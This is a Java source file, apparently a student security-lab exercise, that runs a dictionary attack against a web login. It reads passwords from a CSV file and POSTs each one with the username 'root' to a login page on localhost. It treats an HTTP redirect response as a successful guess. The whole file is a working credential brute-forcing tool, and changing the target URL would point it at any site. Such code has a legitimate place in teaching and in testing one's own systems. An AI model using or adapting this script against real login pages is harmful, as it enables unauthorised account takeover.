import java.io.*;
import java.net.HttpURLConnection;
import java.net.URL;
import java.nio.charset.StandardCharsets;
import java.util.Scanner;

import static java.lang.System.exit;

public class Main {

    public static void main(String[] args) throws IOException {
        String userName="";
        System.out.print("Enter user name : ");
        Scanner sc=new Scanner(System.in);
        userName=sc.nextLine();
        String row;
       BufferedReader csvReader = new BufferedReader(new FileReader("D:\\LEVEL 4 TERM 1\\Dictionary-attack\\dictionary.csv"));
       while ((row = csvReader.readLine()) != null) {
            String[] data = row.split(",");

            String urlParameters  = "username=root&password="+data[0];
            byte[] postData       = urlParameters.getBytes( StandardCharsets.UTF_8 );
            int    postDataLength = postData.length;
            String request        = "http://127.0.0.1/security/login.php";
            URL url            = new URL( request );
            HttpURLConnection conn= (HttpURLConnection) url.openConnection();
            conn.setDoOutput( true );
            conn.setInstanceFollowRedirects( false);
        //    HttpURLConnection.setFollowRedirects(true);
            conn.setRequestMethod( "POST" );
            conn.setRequestProperty( "Content-Type", "application/x-www-form-urlencoded");
            conn.setRequestProperty( "charset", "utf-8");
            conn.setRequestProperty( "Content-Length", Integer.toString( postDataLength ));
            conn.setUseCaches( false );

            try( DataOutputStream wr = new DataOutputStream( conn.getOutputStream())) {
                wr.write( postData );
            }
             int status=conn.getResponseCode();
            System.out.println(status);
            DataInputStream br=new DataInputStream(conn.getInputStream());
           while(true){
                int ch=br.read();
                if(ch==-1){
                    break;
                }
                // System.out.print((char)ch);

           }
            if(status/100==3){
                System.out.println(data[0]+" is  the password\n");
                exit(0);
            }
            else{
                System.out.println(data[0]+" is not the password\n");
               // continue;
            }
          /*  if(s.length()<2){
                System.out.println(data[0]+" is not the password\n");
                continue;
            }
            if(s.charAt(0)=='o' && s.charAt(1)=='k'){
                System.out.println(data[0]+" is  the password\n");
                exit(0);



            }
            else{

                System.out.println(data[0]+" is not the password\n");

            }*/


        }

        csvReader.close();


    }
}
